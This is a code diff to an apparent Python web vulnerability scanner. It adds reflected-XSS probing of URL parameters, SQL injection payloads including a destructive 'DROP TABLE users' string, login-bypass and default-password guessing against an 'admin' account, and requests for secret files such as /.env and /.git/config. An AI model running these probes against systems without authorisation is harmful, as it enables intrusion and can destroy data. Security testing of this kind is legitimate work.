@@ -133,6 +133,13 @@ class BugBountyScanner:
                     print(f"{Fore.GREEN}[+] {header}: {response.headers[header]}")
                 else:
                     print(f"{Fore.RED}[!] Missing security header: {header}")
+                    # Flag missing security headers as vulnerabilities
+                    self.vulnerabilities.append({
+                        'type': 'Missing Security Headers',
+                        'severity': 'Medium',
+                        'description': f'Missing security header: {header}',
+                        'url': self.target_url
+                    })
                     
         except Exception as e:
             print(f"{Fore.RED}[!] Error gathering info: {e}")
@@ -203,8 +210,60 @@ class BugBountyScanner:
             
             print(f"{Fore.GREEN}[+] Found {len(forms)} forms with {len(self.inputs)} input fields")
             
+            # If no forms found, check for potential injection points in URLs
+            if not forms:
+                self.check_url_parameters()
+            
         except Exception as e:
             print(f"{Fore.RED}[!] Error analyzing forms: {e}")
+    
+    def check_url_parameters(self):
+        """Check URL parameters for potential injection points"""
+        print(f"{Fore.YELLOW}[*] Checking URL parameters for injection points...")
+        
+        try:
+            response = self.session.get(self.target_url)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            
+            # Look for links with parameters
+            links = soup.find_all('a', href=True)
+            for link in links:
+                href = link['href']
+                if '?' in href and '=' in href:
+                    print(f"{Fore.YELLOW}[*] Found URL with parameters: {href}")
+                    
+                    # Test for XSS in URL parameters
+                    test_url = urljoin(self.target_url, href)
+                    xss_payload = '<script>alert("XSS")</script>'
+                    
+                    # Replace parameter values with XSS payload
+                    if '=' in href:
+                        base_url, params = href.split('?', 1)
+                        param_dict = parse_qs(params)
+                        
+                        for param_name in param_dict:
+                            param_dict[param_name] = [xss_payload]
+                        
+                        # Reconstruct URL with XSS payload
+                        new_params = '&'.join([f"{k}={v[0]}" for k, v in param_dict.items()])
+                        test_url = urljoin(self.target_url, f"{base_url}?{new_params}")
+                        
+                        try:
+                            test_response = self.session.get(test_url)
+                            if xss_payload in test_response.text:
+                                self.vulnerabilities.append({
+                                    'type': 'Reflected XSS in URL',
+                                    'severity': 'High',
+                                    'description': f'XSS payload reflected in URL parameter: {href}',
+                                    'payload': xss_payload,
+                                    'url': test_url
+                                })
+                                print(f"{Fore.RED}[!] XSS vulnerability found in URL!")
+                        except:
+                            continue
+                            
+        except Exception as e:
+            print(f"{Fore.RED}[!] Error checking URL parameters: {e}")
     
     def check_injection_vulnerabilities(self):
         """Check for injection vulnerabilities (A03:2021)"""
@@ -213,7 +272,8 @@ class BugBountyScanner:
         # Enhanced SQL Injection test payloads
         sql_payloads = [
             "'", "1' OR '1'='1", "1; DROP TABLE users--", "1' UNION SELECT NULL--",
-            "1' AND SLEEP(5)--", "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
+            "1' AND SLEEP(5)--", "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+            "1' OR 1=1#", "1' OR 1=1--", "admin'--", "admin'#", "admin'/*"
         ]
         
         for form in self.forms:
@@ -231,7 +291,8 @@ class BugBountyScanner:
                             response_time = time.time() - start_time
                             
                             # Check for SQL error patterns
-                            sql_errors = ['sql syntax', 'mysql_fetch', 'oracle error', 'sqlite', 'postgresql']
+                            sql_errors = ['sql syntax', 'mysql_fetch', 'oracle error', 'sqlite', 'postgresql', 
+                                        'mysql error', 'sql error', 'database error', 'mysql_fetch_array']
                             if any(error in response.text.lower() for error in sql_errors):
                                 self.vulnerabilities.append({
                                     'type': 'SQL Injection',
@@ -254,6 +315,19 @@ class BugBountyScanner:
                                 })
                                 print(f"{Fore.RED}[!] Time-based SQL Injection detected!")
                                 break
+                            
+                            # Check for successful injection (login bypass, etc.)
+                            if 'welcome' in response.text.lower() or 'dashboard' in response.text.lower():
+                                if 'admin' in payload.lower() or '1=1' in payload:
+                                    self.vulnerabilities.append({
+                                        'type': 'Authentication Bypass',
+                                        'severity': 'Critical',
+                                        'description': f'Authentication bypassed with payload in form {form["action"]}',
+                                        'payload': payload,
+                                        'url': urljoin(self.target_url, form['action'])
+                                    })
+                                    print(f"{Fore.RED}[!] Authentication bypass detected!")
+                                    break
                             
                     except Exception as e:
                         continue
@@ -288,6 +362,26 @@ class BugBountyScanner:
                                     'url': url
                                 })
                                 print(f"{Fore.RED}[!] Login form lacks CSRF protection!")
+                        
+                        # Test for weak passwords
+                        weak_passwords = ['admin', 'password', '123456', 'admin123']
+                        for weak_pass in weak_passwords:
+                            try:
+                                login_data = {'username': 'admin', 'password': weak_pass}
+                                login_response = self.session.post(url, data=login_data)
+                                
+                                # Check if login was successful
+                                if 'welcome' in login_response.text.lower() or 'dashboard' in login_response.text.lower():
+                                    self.vulnerabilities.append({
+                                        'type': 'Weak Password',
+                                        'severity': 'High',
+                                        'description': f'Weak password accepted: {weak_pass}',
+                                        'url': url
+                                    })
+                                    print(f"{Fore.RED}[!] Weak password accepted!")
+                                    break
+                            except:
+                                continue
                                 
             except Exception as e:
                 continue
@@ -300,7 +394,8 @@ class BugBountyScanner:
         sensitive_files = [
             '/robots.txt', '/sitemap.xml', '/.env', '/config.php', '/wp-config.php',
             '/.git/config', '/.htaccess', '/web.config', '/.env.local', '/config.ini',
-            '/database.yml', '/application.properties', '/.dockerignore', '/docker-compose.yml'
+            '/.dockerignore', '/docker-compose.yml',
+            '/phpinfo.php', '/info.php', '/test.php', '/debug.php'
         ]
         
         for file_path in sensitive_files:
@@ -328,6 +423,16 @@ class BugBountyScanner:
                             })
                             print(f"{Fore.RED}[!] Sensitive data found in {file_path}!")
                             break
+                    
+                    # Flag accessible sensitive files as vulnerabilities
+                    if file_path in ['/.env', '/config.php', '/wp-config.php', '/.git/config']:
+                        self.vulnerabilities.append({
+                            'type': 'Sensitive File Accessible',
+                            'severity': 'High',
+                            'description': f'Sensitive file accessible: {file_path}',
+                            'url': url
+                        })
+                        print(f"{Fore.RED}[!] Sensitive file accessible!")
                             
             except Exception as e:
                 continue
@@ -384,6 +489,12 @@ class BugBountyScanner:
             # Check for verbose error messages
             if 'error' in response.text.lower() and len(response.text) > 1000:
                 print(f"{Fore.YELLOW}[*] Verbose error messages detected")
+                self.vulnerabilities.append({
+                    'type': 'Verbose Error Messages',
+                    'severity': 'Medium',
+                    'description': 'Verbose error messages may reveal sensitive information',
+                    'url': self.target_url
+                })
             
             # Check for directory listing
             test_dir = urljoin(self.target_url, '/images/')
@@ -410,7 +521,9 @@ class BugBountyScanner:
             '"><script>alert("XSS")</script>',
             'javascript:alert("XSS")',
             '<img src=x onerror=alert("XSS")>',
-            '<svg onload=alert("XSS")>'
+            '<svg onload=alert("XSS")>',
+            '"><img src=x onerror=alert("XSS")>',
+            '"><iframe src="javascript:alert(\'XSS\')">'
         ]
         
         for form in self.forms:
@@ -504,6 +617,8 @@ class BugBountyScanner:
             
             for i, vuln in enumerate(self.vulnerabilities, 1):
                 severity_color = Fore.RED if vuln['severity'] == 'High' else Fore.YELLOW
+                if vuln['severity'] == 'Critical':
+                    severity_color = Fore.RED
                 print(f"{severity_color}[{i}] {vuln['type']} ({vuln['severity']})")
                 print(f"    Description: {vuln['description']}")
                 print(f"    URL: {vuln.get('url', 'N/A')}")
